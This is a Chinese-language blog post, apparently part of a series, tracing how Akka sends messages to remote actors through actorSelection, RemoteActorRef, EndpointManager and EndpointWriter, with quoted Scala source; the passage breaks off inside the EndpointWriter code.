    <content type="html"><![CDATA[<h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h2><pre><code> 上文我们介绍了remote模式下Actor的创建，其实与local的创建并没有太大区别，一般情况下还是使用LocalActorRef创建了Actor。那么发消息是否意味着也是相同的呢？既然actorOf还是委托给了LocalActorRef，那么在本地创建的Actor发消息还是跟以前一样的，那么如果如何给远程的Actor发消息呢？我们一般是通过actorSelection或者给远程Actor发送一个Identify消息，来接收对应的ActorRef，然后再发消息。我们来分析一下这两者的区别。</code></pre><h2 id="2-ActorSelection"><a href="#2-ActorSelection" class="headerlink" title="2.ActorSelection"></a>2.ActorSelection</h2><pre><code> 首先来看actorSelection，不管是用ActorSystem或者ActorContext的actorSelection方法，最终都是调用了ActorRefFactory对应的方法。</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Construct an [[akka.actor.ActorSelection]] from the given path, which is</span></span><br><span class="line"><span class="comment">   * parsed for wildcards (these are replaced by regular expressions</span></span><br><span class="line"><span class="comment">   * internally). No attempt is made to verify the existence of any part of</span></span><br><span class="line"><span class="comment">   * the supplied path, it is recommended to send a message and gather the</span></span><br><span class="line"><span class="comment">   * replies in order to resolve the matching set of actors.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function">def <span class="title">actorSelection</span><span class="params">(path: String)</span>: ActorSelection </span>= path match &#123;</span><br><span class="line">    <span class="function"><span class="keyword">case</span> <span class="title">RelativeActorPath</span><span class="params">(elems)</span> ⇒</span></span><br><span class="line"><span class="function">      <span class="title">if</span> <span class="params">(elems.isEmpty)</span> <span class="title">ActorSelection</span><span class="params">(provider.deadLetters, <span class="string">&quot;&quot;</span>)</span></span></span><br><span class="line"><span class="function">      <span class="keyword">else</span> <span class="title">if</span> <span class="params">(elems.head.isEmpty)</span> <span class="title">ActorSelection</span><span class="params">(provider.rootGuardian, elems.tail)</span></span></span><br><span class="line"><span class="function">      <span class="keyword">else</span> <span class="title">ActorSelection</span><span class="params">(lookupRoot, elems)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">case</span> <span class="title">ActorPathExtractor</span><span class="params">(address, elems)</span> ⇒</span></span><br><span class="line"><span class="function">      <span class="title">ActorSelection</span><span class="params">(provider.rootGuardianAt(address)</span>, elems)</span></span><br><span class="line"><span class="function">    <span class="keyword">case</span> _ ⇒</span></span><br><span class="line"><span class="function">      <span class="title">ActorSelection</span><span class="params">(provider.deadLetters, <span class="string">&quot;&quot;</span>)</span></span></span><br><span class="line"><span class="function">  &#125;</span></span><br></pre></td></tr></table></figure><p>我们发现它支持两种类型的path：RelativeActorPath、ActorPathExtractor。<br>​</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Extractor for so-called “relative actor paths” as in “relative URI”, not in</span></span><br><span class="line"><span class="comment"> * “relative to some actor”. Examples:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  * &quot;grand/child&quot;</span></span><br><span class="line"><span class="comment"> *  * &quot;/user/hello/world&quot;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">object RelativeActorPath extends PathUtils &#123;</span><br><span class="line">  <span class="function">def <span class="title">unapply</span><span class="params">(addr: String)</span>: Option[immutable.Seq[String]] </span>= &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      val uri = <span class="keyword">new</span> URI(addr)</span><br><span class="line">      <span class="keyword">if</span> (uri.isAbsolute) <span class="function">None</span></span><br><span class="line"><span class="function">      <span class="keyword">else</span> <span class="title">Some</span><span class="params">(split(uri.getRawPath, uri.getRawFragment)</span>)</span></span><br><span class="line"><span class="function">    &#125; <span class="keyword">catch</span> </span>&#123;</span><br><span class="line">      <span class="keyword">case</span> _: URISyntaxException ⇒ None</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-1-RelativeActorPath"><a href="#2-1-RelativeActorPath" class="headerlink" title="2.1 RelativeActorPath"></a>2.1 RelativeActorPath</h3><pre><code>  RelativeActorPath提取器比较简单，就是创建了一个URI对象，然后判断其是否为Absolute，如果是就返回None，如果不是就返回对应的elemes。  对于远程Actor，我们一般会指定主机名、端口号，例如akka.tcp://actorSystemName@10.0.0.1:2552/user/actorName，根据URI的定义，这个URI的schema是akka.tcp，很显然是Absolute，那就会返回None。</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Given an ActorPath it returns the Address and the path elements if the path is well-formed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">object ActorPathExtractor extends PathUtils &#123;</span><br><span class="line">  <span class="function">def <span class="title">unapply</span><span class="params">(addr: String)</span>: Option[<span class="params">(Address, immutable.Iterable[String])</span>] </span>=</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      val uri = <span class="keyword">new</span> URI(addr)</span><br><span class="line">      uri.getRawPath match &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">null</span> ⇒ None</span><br><span class="line">        <span class="keyword">case</span> path ⇒ AddressFromURIString.unapply(uri).map((_, split(path, uri.getRawFragment).drop(<span class="number">1</span>)))</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">      <span class="keyword">case</span> _: URISyntaxException ⇒ None</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-2-ActorPathExtractor"><a href="#2-2-ActorPathExtractor" class="headerlink" title="2.2  ActorPathExtractor"></a>2.2  ActorPathExtractor</h3><pre><code>     ActorPathExtractor这个提取器的名称定义的是有问题的，既然actorSelection只支持两种类型的路径选择：本地和远程。第一个解析器定义成相对路径，那么后面一个就直接是绝对路径好了啊，为啥用ActorPathExtractor这样蹩脚的命名？难道本地模式下，就不是ActorPath提取器了？我们来看看对于akka.tcp://actorSystemName@10.0.0.1:2552/user/actorName提取出了什么。经调试，address是akka.tcp://actorSystemName@10.0.0.1:2552，elems就是后面的user、actorName了。</code></pre><p>也就是说remote模式下，如果有host、prot等信息就会返回_ActorSelection(provider.rootGuardianAt(address), elems)_这个类。不过好像无论哪种情况都返回这个类，好尴尬啊，但传入的第一个参数是不同的：provider.rootGuardianAt(address)。也就是说actorSelection这个函数是不区分当前的模式的，只要含有host/port就会传入provider.rootGuardianAt(address)，否则就传入provider.rootGuardian。如果在local模式下，也强制用actorSelection查找远程Actor会发生什么呢？我们来看看LocalActorRefProvider。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">override def <span class="title">rootGuardianAt</span><span class="params">(address: Address)</span>: ActorRef </span>=</span><br><span class="line">  <span class="keyword">if</span> (address == rootPath.address) rootGuardian</span><br><span class="line">  <span class="keyword">else</span> deadLetters</span><br></pre></td></tr></table></figure><p>   local模式下，如果待查询actor的地址就是本地地址，则直接在本地返回查找；否则就返回deadLetters。其实是无法查找远程actor的。那么RemoteActorRefProvider呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">def <span class="title">rootGuardianAt</span><span class="params">(address: Address)</span>: ActorRef </span>= &#123;</span><br><span class="line">    <span class="keyword">if</span> (hasAddress(address)) rootGuardian</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">new</span> RemoteActorRef(transport, transport.localAddressForRemote(address),</span><br><span class="line">        RootActorPath(address), Nobody, props = None, deploy = None)</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">      <span class="function"><span class="keyword">case</span> <span class="title">NonFatal</span><span class="params">(e)</span> ⇒</span></span><br><span class="line"><span class="function">        log.<span class="title">error</span><span class="params">(e, <span class="string">&quot;No root guardian at [&#123;&#125;]&quot;</span>, address)</span></span></span><br><span class="line"><span class="function">        new <span class="title">EmptyLocalActorRef</span><span class="params">(<span class="keyword">this</span>, RootActorPath(address)</span>, eventStream)</span></span><br><span class="line"><span class="function">    &#125;</span></span><br><span class="line"><span class="function">  &#125;</span></span><br></pre></td></tr></table></figure><pre><code>    当然了，它也会判断一下本地地址是否包含待查询地址（防止多网卡或其他特殊情况），如果包含，则意味着是本地Actor交给rootGuardian；否则就创建RemoteActorRef。     分析到这里我们知道了，其实在remote模式下，actorSelection返回了一个RemoteActorRef，还记得这个类的作用嘛？我们之前简单分析过，它其实是对远程Acotor的一个本地网络代理，也就是说所有通过actorSelection发送给远程actor的消息，都会经过他中转。我们继续分析ActorSelection的源码。</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Construct an ActorSelection from the given string representing a path</span></span><br><span class="line"><span class="comment">   * relative to the given target. This operation has to create all the</span></span><br><span class="line"><span class="comment">   * matching magic, so it is preferable to cache its result if the</span></span><br><span class="line"><span class="comment">   * intention is to send messages frequently.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function">def <span class="title">apply</span><span class="params">(anchorRef: ActorRef, elements: Iterable[String])</span>: ActorSelection </span>= &#123;</span><br><span class="line">    val compiled: immutable.IndexedSeq[SelectionPathElement] = elements.collect(&#123;</span><br><span class="line">      <span class="keyword">case</span> x <span class="keyword">if</span> !x.isEmpty ⇒</span><br><span class="line">        <span class="keyword">if</span> ((x.indexOf(<span class="string">&#x27;?&#x27;</span>) != -<span class="number">1</span>) || (x.indexOf(<span class="string">&#x27;*&#x27;</span>) != -<span class="number">1</span>)) SelectChildPattern(x)</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (x == <span class="string">&quot;..&quot;</span>) <span class="function">SelectParent</span></span><br><span class="line"><span class="function">        <span class="keyword">else</span> <span class="title">SelectChildName</span><span class="params">(x)</span></span></span><br><span class="line"><span class="function">    &#125;)<span class="params">(scala.collection.breakOut)</span></span></span><br><span class="line"><span class="function">    new ActorSelection with ScalaActorSelection </span>&#123;</span><br><span class="line">      override val anchor = anchorRef</span><br><span class="line">      override val path = compiled</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><pre><code>    很显然这里的anchorRef是上面创建的RemoteActorRef实例，其中ActorSelection的anchor（锚定）是anchorRef。至此，一个ActorSelection创建完毕。那么如何发消息呢？这就需要分析tell或者！方法了。</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">def <span class="title">tell</span><span class="params">(msg: Any, sender: ActorRef)</span>: Unit </span>=</span><br><span class="line">  ActorSelection.deliverSelection(anchor.asInstanceOf[InternalActorRef], sender,</span><br><span class="line">    ActorSelectionMessage(msg, path, wildcardFanOut = <span class="keyword">false</span>))</span><br></pre></td></tr></table></figure><p>其实乍一看，我们应该明白，这就是在deliverSelection函数内部，把消息封装成ActorSelectionMessage发送给了anchor。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/804884/1632642679674-91d9cb18-d93a-406b-8e07-83f794ee0704.png#clientId=uefeb788d-1da0-4&from=paste&id=u03d3d04b&margin=%5Bobject%20Object%5D&originHeight=673&originWidth=940&originalType=url&ratio=1&status=done&style=none&taskId=uc9e1cf4b-77e2-46b0-900b-e572b8de1b2"><br>​</p><pre><code>   该函数首先判断sel的elements是否为空，很显然不为空，进入rec函数。该函数比较复杂而且还是一个尾递归函数，但我们知道此处的ref就是RemoteActorRef，那么RemoteActorRef是不是一个ActorRefWithCell呢？</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">private</span>[akka] <span class="class"><span class="keyword">class</span> <span class="title">RemoteActorRef</span> <span class="title">private</span>[<span class="title">akka</span>] (</span></span><br><span class="line"><span class="class">  <span class="title">remote</span>:                <span class="title">RemoteTransport</span>,</span></span><br><span class="line"><span class="class">  <span class="title">val</span> <span class="title">localAddressToUse</span>: <span class="title">Address</span>,</span></span><br><span class="line"><span class="class">  <span class="title">val</span> <span class="title">path</span>:              <span class="title">ActorPath</span>,</span></span><br><span class="line"><span class="class">  <span class="title">val</span> <span class="title">getParent</span>:         <span class="title">InternalActorRef</span>,</span></span><br><span class="line"><span class="class">  <span class="title">props</span>:                 <span class="title">Option</span>[<span class="title">Props</span>],</span></span><br><span class="line"><span class="class">  <span class="title">deploy</span>:                <span class="title">Option</span>[<span class="title">Deploy</span>])</span></span><br><span class="line"><span class="class">  <span class="keyword">extends</span> <span class="title">InternalActorRef</span> <span class="title">with</span> <span class="title">RemoteRef</span></span></span><br></pre></td></tr></table></figure><p>那么rec就会走到case _的逻辑，也就是把消息转发给了前面创建的RemoteActorRef，我们来看看这个示例是如何实现tell的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">override def !(message: Any)(implicit sender: ActorRef = Actor.noSender): Unit = &#123;</span><br><span class="line">    <span class="keyword">if</span> (message == <span class="keyword">null</span>) <span class="keyword">throw</span> InvalidMessageException(<span class="string">&quot;Message is null&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span> remote.send(message, OptionVal(sender), <span class="keyword">this</span>) <span class="function"><span class="keyword">catch</span> <span class="title">handleException</span><span class="params">(message, sender)</span></span></span><br><span class="line"><span class="function">  &#125;</span></span><br></pre></td></tr></table></figure><h3 id="2-3-RemoteActorRef"><a href="#2-3-RemoteActorRef" class="headerlink" title="2.3 RemoteActorRef"></a>2.3 RemoteActorRef</h3><pre><code>    RemoteActorRef这个类，通过remote把消息发送出去了，那么remote是什么呢？RemoteTransport是不是很熟悉？在ActorSystem启动的时候我们分析过这个对象，它是Remoting类的实例，Remoting里面send方法是怎样的呢？</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">override def <span class="title">send</span><span class="params">(message: Any, senderOption: OptionVal[ActorRef], recipient: RemoteActorRef)</span>: Unit </span>= endpointManager match &#123;</span><br><span class="line">    <span class="function"><span class="keyword">case</span> <span class="title">Some</span><span class="params">(manager)</span> ⇒ manager.<span class="title">tell</span><span class="params">(Send(message, senderOption, recipient)</span>, sender </span>= senderOption getOrElse Actor.noSender)</span><br><span class="line">    <span class="keyword">case</span> None          ⇒ <span class="keyword">throw</span> <span class="keyword">new</span> RemoteTransportExceptionNoStackTrace(<span class="string">&quot;Attempted to send remote message but Remoting is not running.&quot;</span>, <span class="keyword">null</span>)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="3-EndpointManager"><a href="#3-EndpointManager" class="headerlink" title="3. EndpointManager"></a>3. EndpointManager</h2><pre><code>   它又把消息转发给了manager，而manager就是endpointManager。endpointManager是不是也比较眼熟呢？前面文章中我们也见到过，这是一个EndpointManager实例，而EndpointManager是一个Actor。请注意这里用Send又对message进行了封装。EndpointManager是如何对Send消息进行反应的呢？</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> s @ Send(message, senderOption, recipientRef, _) ⇒</span><br><span class="line">      val recipientAddress = recipientRef.path.<span class="function">address</span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function">      def <span class="title">createAndRegisterWritingEndpoint</span><span class="params">()</span>: ActorRef </span>= &#123;</span><br><span class="line">        endpoints.registerWritableEndpoint(</span><br><span class="line">          recipientAddress,</span><br><span class="line">          uid = None,</span><br><span class="line">          createEndpoint(</span><br><span class="line">            recipientAddress,</span><br><span class="line">            recipientRef.localAddressToUse,</span><br><span class="line">            transportMapping(recipientRef.localAddressToUse),</span><br><span class="line">            settings,</span><br><span class="line">            handleOption = None,</span><br><span class="line">            writing = <span class="keyword">true</span>))</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      endpoints.writableEndpointWithPolicyFor(recipientAddress) match &#123;</span><br><span class="line">        <span class="function"><span class="keyword">case</span> <span class="title">Some</span><span class="params">(Pass(endpoint, _)</span>) ⇒</span></span><br><span class="line"><span class="function">          endpoint ! s</span></span><br><span class="line"><span class="function">        <span class="keyword">case</span> <span class="title">Some</span><span class="params">(Gated(timeOfRelease)</span>) ⇒</span></span><br><span class="line"><span class="function">          <span class="title">if</span> <span class="params">(timeOfRelease.isOverdue()</span>) <span class="title">createAndRegisterWritingEndpoint</span><span class="params">()</span> ! s</span></span><br><span class="line"><span class="function">          <span class="keyword">else</span> extendedSystem.deadLetters ! s</span></span><br><span class="line"><span class="function">        <span class="keyword">case</span> <span class="title">Some</span><span class="params">(Quarantined(uid, _)</span>) ⇒</span></span><br><span class="line"><span class="function">          <span class="comment">// timeOfRelease is only used for garbage collection reasons, therefore it is ignored here. We still have</span></span></span><br><span class="line"><span class="function">          <span class="comment">// the Quarantined tombstone and we know what UID we don&#x27;t want to accept, so use it.</span></span></span><br><span class="line"><span class="function">          <span class="title">createAndRegisterWritingEndpoint</span><span class="params">()</span> ! s</span></span><br><span class="line"><span class="function">        <span class="keyword">case</span> None ⇒</span></span><br><span class="line"><span class="function">          <span class="title">createAndRegisterWritingEndpoint</span><span class="params">()</span> ! s</span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function">      &#125;</span></span><br></pre></td></tr></table></figure><p>​</p><p>分析以上逻辑，简单来看，会先判断是不是存在一个endpoint，如果存在说明链接已经建立，可以直接发送，否则出于其他状态，就重新创建endpoint，然后把消息转发给该endpoint。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">def <span class="title">registerWritableEndpoint</span><span class="params">(address: Address, uid: Option[Int], endpoint: ActorRef)</span>: ActorRef </span>=</span><br><span class="line">      addressToWritable.get(address) match &#123;</span><br><span class="line">        <span class="function"><span class="keyword">case</span> <span class="title">Some</span><span class="params">(Pass(e, _)</span>) ⇒</span></span><br><span class="line"><span class="function">          throw new <span class="title">IllegalArgumentException</span><span class="params">(s<span class="string">&quot;Attempting to overwrite existing endpoint [$e] with [$endpoint]&quot;</span>)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">case</span> _ ⇒</span></span><br><span class="line"><span class="function">          <span class="comment">// note that this overwrites Quarantine marker,</span></span></span><br><span class="line"><span class="function">          <span class="comment">// but that is ok since we keep the quarantined uid in addressToRefuseUid</span></span></span><br><span class="line"><span class="function">          addressToWritable +</span>= address → Pass(endpoint, uid)</span><br><span class="line">          writableToAddress += endpoint → address</span><br><span class="line">          endpoint</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>registerWritableEndpoint没有太复杂的逻辑，就是查询addressToWritable这个HashMap，如果不存在则把对应的endpoint加入缓存，并返回endpoint。而endpoint是通过createEndpoint创建的。</p><h3 id="3-1-createEndpoint"><a href="#3-1-createEndpoint" class="headerlink" title="3.1 createEndpoint"></a>3.1 createEndpoint</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> def <span class="title">createEndpoint</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    remoteAddress:    Address,</span></span></span><br><span class="line"><span class="params"><span class="function">    localAddress:     Address,</span></span></span><br><span class="line"><span class="params"><span class="function">    transport:        AkkaProtocolTransport,</span></span></span><br><span class="line"><span class="params"><span class="function">    endpointSettings: RemoteSettings,</span></span></span><br><span class="line"><span class="params"><span class="function">    handleOption:     Option[AkkaProtocolHandle],</span></span></span><br><span class="line"><span class="params"><span class="function">    writing:          Boolean)</span>: ActorRef </span>= &#123;</span><br><span class="line">    require(transportMapping contains localAddress, <span class="string">&quot;Transport mapping is not defined for the address&quot;</span>)</span><br><span class="line">    <span class="comment">// refuseUid is ignored for read-only endpoints since the UID of the remote system is already known and has passed</span></span><br><span class="line">    <span class="comment">// quarantine checks</span></span><br><span class="line">    val refuseUid = endpoints.refuseUid(remoteAddress)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (writing) context.watch(context.actorOf(</span><br><span class="line">      RARP(extendedSystem).configureDispatcher(ReliableDeliverySupervisor.props(</span><br><span class="line">        handleOption,</span><br><span class="line">        localAddress,</span><br><span class="line">        remoteAddress,</span><br><span class="line">        refuseUid,</span><br><span class="line">        transport,</span><br><span class="line">        endpointSettings,</span><br><span class="line">        AkkaPduProtobufCodec,</span><br><span class="line">        receiveBuffers)).withDeploy(Deploy.local),</span><br><span class="line">      <span class="string">&quot;reliableEndpointWriter-&quot;</span> + AddressUrlEncoder(remoteAddress) + <span class="string">&quot;-&quot;</span> + endpointId.next()))</span><br><span class="line">    <span class="keyword">else</span> context.watch(context.actorOf(</span><br><span class="line">      RARP(extendedSystem).configureDispatcher(EndpointWriter.props(</span><br><span class="line">        handleOption,</span><br><span class="line">        localAddress,</span><br><span class="line">        remoteAddress,</span><br><span class="line">        refuseUid,</span><br><span class="line">        transport,</span><br><span class="line">        endpointSettings,</span><br><span class="line">        AkkaPduProtobufCodec,</span><br><span class="line">        receiveBuffers,</span><br><span class="line">        reliableDeliverySupervisor = None)).withDeploy(Deploy.local),</span><br><span class="line">      <span class="string">&quot;endpointWriter-&quot;</span> + AddressUrlEncoder(remoteAddress) + <span class="string">&quot;-&quot;</span> + endpointId.next()))</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>createEndpoint最终创建了ReliableDeliverySupervisor这个Actor，也就是说RemoteActorRef最终又把消息发送给了ReliableDeliverySupervisor，ReliableDeliverySupervisor收到消息去调用handleSend方法。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/804884/1632642679986-24a75e0b-3f0f-43cc-a5a0-cf6b35a042f0.png#clientId=uefeb788d-1da0-4&from=paste&id=udb08a09c&margin=%5Bobject%20Object%5D&originHeight=238&originWidth=637&originalType=url&ratio=1&status=done&style=none&taskId=udf6c091e-69f4-471f-95a8-c686b9c8d5f"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> def <span class="title">handleSend</span><span class="params">(send: Send)</span>: Unit </span>=</span><br><span class="line">  <span class="keyword">if</span> (send.message.isInstanceOf[SystemMessage]) &#123;</span><br><span class="line">    val sequencedSend = send.copy(seqOpt = Some(nextSeq()))</span><br><span class="line">    tryBuffer(sequencedSend)</span><br><span class="line">    <span class="comment">// If we have not confirmed the remote UID we cannot transfer the system message at this point just buffer it.</span></span><br><span class="line">    <span class="comment">// GotUid will kick resendAll() causing the messages to be properly written.</span></span><br><span class="line">    <span class="comment">// Flow control by not sending more when we already have many outstanding.</span></span><br><span class="line">    <span class="keyword">if</span> (uidConfirmed &amp;&amp; resendBuffer.nonAcked.size &lt;= settings.SysResendLimit)</span><br><span class="line">      writer ! sequencedSend</span><br><span class="line">  &#125; <span class="keyword">else</span> writer ! send</span><br></pre></td></tr></table></figure><p>除去特殊情况，用户发的普通消息又发送给了writer，艾玛我去，真是绕啊。writer是什么呢？</p><h3 id="3-2-createWriter"><a href="#3-2-createWriter" class="headerlink" title="3.2 createWriter"></a>3.2 createWriter</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> writer: ActorRef = createWriter()</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> def <span class="title">createWriter</span><span class="params">()</span>: ActorRef </span>= &#123;</span><br><span class="line">    context.watch(context.actorOf(RARP(context.system).configureDispatcher(EndpointWriter.props(</span><br><span class="line">      handleOrActive = currentHandle,</span><br><span class="line">      localAddress = localAddress,</span><br><span class="line">      remoteAddress = remoteAddress,</span><br><span class="line">      refuseUid,</span><br><span class="line">      transport = transport,</span><br><span class="line">      settings = settings,</span><br><span class="line">      AkkaPduProtobufCodec,</span><br><span class="line">      receiveBuffers = receiveBuffers,</span><br><span class="line">      reliableDeliverySupervisor = Some(self))).withDeploy(Deploy.local), <span class="string">&quot;endpointWriter&quot;</span>))</span><br></pre></td></tr></table></figure><p>很显然这又是一个Actor！！！哎，继续查找EndpointWriter这个Actor喽</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">def receive = <span class="keyword">if</span> (handle.isEmpty) initializing <span class="keyword">else</span> writing</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">val writing: Receive = &#123;</span><br><span class="line">    <span class="keyword">case</span> s: Send ⇒</span><br><span class="line">      <span class="keyword">if</span> (!writeSend(s)) &#123;</span><br><span class="line">        enqueueInBuffer(s)</span><br><span class="line">        